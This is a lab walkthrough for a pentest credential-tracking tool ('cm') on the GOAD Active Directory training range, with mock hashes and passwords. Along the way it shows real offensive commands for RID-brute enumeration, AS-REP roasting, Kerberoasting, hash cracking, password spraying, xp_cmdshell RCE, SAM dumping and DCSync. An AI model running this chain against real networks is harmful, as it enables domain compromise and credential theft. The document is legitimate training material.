# Lab 01 — The North (GOAD, single domain)

**Range style:** [GOAD](https://github.com/Orange-Cyberdefense/GOAD) — the
`north.sevenkingdoms.local` domain in isolation.
**Goal:** anonymous foothold → AS-REP roast → Kerberoast → MSSQL RCE → local SAM →
DCSync, recording every artifact in `cm` as you go.

> Mock data. All hashes/passwords are invented. Offensive commands are shown for
> context only.

## Topology

| Host | IP | Domain | Role |
|---|---|---|---|
| `winterfell` | 192.168.56.11 | north.sevenkingdoms.local | Domain Controller |
| `castelblack` | 192.168.56.22 | north.sevenkingdoms.local | Member server (MSSQL) |

```bash
export CM_DB=~/engagements/goad-north/engagement.db
cm init
```

---

## Step 1 — Enumerate users (guest / RID-brute), before you have any secret

You can often list domain users with a null/guest bind before you can
authenticate. You know *who exists*, not their passwords — so record **identities
with no secret**.

```bash
# attack (context)
nxc smb 192.168.56.11 -u '' -p '' --rid-brute
```
```bash
# record who exists
cm add user 'north.sevenkingdoms.local\brandon.stark' --desc 'DONT_REQ_PREAUTH -> AS-REP roastable'
cm add user 'north.sevenkingdoms.local\jon.snow'
cm add user 'north.sevenkingdoms.local\sql_svc' --desc 'SPN MSSQLSvc/castelblack -> kerberoastable'
cm add user 'north.sevenkingdoms.local\samwell.tarly'
```
```
  + domain north.sevenkingdoms.local
  + user north.sevenkingdoms.local\brandon.stark
  + user north.sevenkingdoms.local\jon.snow
  + user north.sevenkingdoms.local\sql_svc
  + user north.sevenkingdoms.local\samwell.tarly
```

`--desc` labels the account (what it *is*); it shows inline in `cm ls`. Use it to
flag the juicy ones you spotted in BloodHound.

---

## Step 2 — AS-REP roast `brandon.stark`

`brandon.stark` has pre-auth disabled, so anyone can pull an AS-REP hash for him.
Record the hash as his secret.

```bash
# attack
impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile users.txt -no-pass -dc-ip 192.168.56.11
```
```bash
cm cred 'north.sevenkingdoms.local\brandon.stark' \
  --hash 'kerberos_asrep:$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:aa11bb22...' \
  --src 'GetNPUsers.py (anonymous)'
```
```
  + secret #1 kerberos_asrep $krb5asrep$23$brandon...
  + link north.sevenkingdoms.local\brandon.stark <-> #1 kerberos_asrep $krb5asrep$23$brandon...
  + observation GetNPUsers.py (anonymous)
```

`--src` is provenance (where you *found* it) — it stacks up as your sourcing trail
for the report. `--desc` is a label on the account; `--src` is evidence.

---

## Step 3 — Export the hash with the exact crack command

```bash
cm export hashes --type kerberos_asrep > asrep.hash
```
```
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:aa11bb22...      # -> stdout / the file
# kerberos_asrep hashcat -m 18200 | john --format=krb5asrep          # -> stderr
```

The hash goes to stdout (your file); the **`hashcat -m` / `john --format` hint
goes to stderr**, so `> asrep.hash` stays clean but you still see exactly how to
crack it. No more looking up mode numbers.

---

## Step 4 — Crack it and feed the potfile back

```bash
hashcat -m 18200 asrep.hash rockyou.txt      # cracks to: Winter_is_coming
cm cracked --from ~/.local/share/hashcat/hashcat.potfile
```
```
cracked: /…/hashcat.potfile
  1 new, 0 already linked
```

`cracked --from` matches by **hash value** (robust to the colons inside Kerberos
hashes, case-insensitive), and the recovered plaintext is linked to
`brandon.stark` automatically — you don't name the user again.

---

## Step 5 — Confirm the foothold

Cracked ≠ logged-in. Prove it, and `cm` turns the credential into a **valid access**:

```bash
nxc smb 192.168.56.11 -u brandon.stark -p 'Winter_is_coming'
```
```bash
cm works 'north.sevenkingdoms.local\brandon.stark' --at winterfell --proto smb --priv user
```
```
  = link north.sevenkingdoms.local\brandon.stark <-> #2 plaintext Winter_is_coming
  + host winterfell
  + access north.sevenkingdoms.local\brandon.stark -> smb/winterfell [valid, user]
```

---

## Step 6 — Kerberoast `sql_svc` with the foothold, then crack

```bash
# attack
impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:'Winter_is_coming' -request -dc-ip 192.168.56.11
```
```bash
cm cred 'north.sevenkingdoms.local\sql_svc' \
  --hash 'kerberos_tgs:$krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL*$1234abcd...' \
  --src 'GetUserSPNs.py via brandon.stark'
cm export hashes --type kerberos_tgs > tgs.hash     # stderr hint: hashcat -m 13100 | john --format=krb5tgs
cm cracked --from ~/.local/share/hashcat/hashcat.potfile      # -> Password123!
```

---

## Step 7 — `sql_svc` logs into MSSQL on castelblack

A service account authenticating to its service is a **service-scoped** access —
note the `host:port` target and free-text privilege.

```bash
cm works 'north.sevenkingdoms.local\sql_svc' --at castelblack:1433 --proto mssql --priv 'sysadmin (xp_cmdshell)'
```
```
  + service castelblack:1433
  + access north.sevenkingdoms.local\sql_svc -> mssql/castelblack:1433 [valid, sysadmin (xp_cmdshell)]
```

---

## Step 8 — Reuse spray, lockout-safe

Try `sql_svc`'s password against other users. Record hits with `works`, misses
with `fail`. `--secret 'plaintext:Password123!'` reuses the existing secret row
(no duplicates).

```bash
cm works 'north.sevenkingdoms.local\jon.snow'      --at winterfell --proto smb --secret 'plaintext:Password123!'
cm fail  'north.sevenkingdoms.local\samwell.tarly' --at winterfell --proto smb --secret 'plaintext:Password123!'
```
```
  + link north.sevenkingdoms.local\jon.snow <-> #4 plaintext Password123!
  + access north.sevenkingdoms.local\jon.snow -> smb/winterfell [valid]
  + access north.sevenkingdoms.local\samwell.tarly -> smb/winterfell [invalid]
```

**Why this matters:** `fail` records an *invalid access* but never links the
password as owned — so the disproven pair is excluded from `export pairs`, and you
won't re-spray a known-bad credential into a lockout.

---

## Step 9 — RCE → local SAM on castelblack

`xp_cmdshell` → SYSTEM → dump the local SAM. The whole log can be fed in; noise is
ignored, and because these are **local** accounts you pass `--host`.

```bash
cm import samdump --host castelblack castelblack_sam.txt
```
```
imported: 3 NT hash(es)
```

---

## Step 10 — Local admin reused → DCSync the domain

The local admin hash from castelblack is reused on `winterfell`; that gets you DA,
then DCSync dumps the domain. NTDS accounts are **domain** accounts (`--domain`),
and the dump **folds into the users you already have** (brandon, jon, sql_svc get
their NT hashes added — same rows, no duplicates).

```bash
cm works 'castel_adm@castelblack' --nt b4b9b02e…e2b --at winterfell --proto smb --priv local_admin
cm import samdump --domain north.sevenkingdoms.local winterfell_ntds.txt
```
```
  + access castel_adm@castelblack -> smb/winterfell [valid, local_admin]
imported: 5 NT hash(es)
```

---

## Review — what you walk away with

**Lateral-movement view (every confirmed login):**
```bash
cm where --valid
```
```
valid accesses:
  north.sevenkingdoms.local\brandon.stark  smb/winterfell  valid  [user]
  north.sevenkingdoms.local\jon.snow  smb/winterfell  valid
  castel_adm@castelblack  smb/winterfell  valid  [local_admin]
  north.sevenkingdoms.local\sql_svc  mssql/castelblack:1433  valid  [sysadmin (xp_cmdshell)]
```

**Pass-the-hash spray list** (`user:nthash`, incl. `krbtgt` for a golden ticket):
```bash
cm export pairs --type ntlm
```
```
Administrator:cf3a5525ee9414229e66279623ed5c58
…
krbtgt:9f8a2c1b3d4e5f60718293a4b5c6d7e8
sql_svc:bbca2d1234ff5e6677889900aabbccdd
```

**Still to crack** (with the command baked in):
```bash
cm todo-crack        # lists the 8 NTDS hashes + '# ntlm  hashcat -m 1000 | john --format=nt'
```

## `cm` features this lab exercised

- `add user` — enumerated principals with no secret yet
- `cred --hash kerberos_asrep:` / `kerberos_tgs:` — roast hashes
- `export hashes --type` — with stderr `hashcat -m` / `john --format` hints
- `cracked --from` — potfile re-import, matches by hash value, auto-propagates
- `works` / `fail` — confirm logins; lockout-safe spraying
- `import samdump --host` (SAM) and `--domain` (NTDS) — dedupes into known users
- `where --valid`, `export pairs --type ntlm`, `todo-crack` — the payoff views
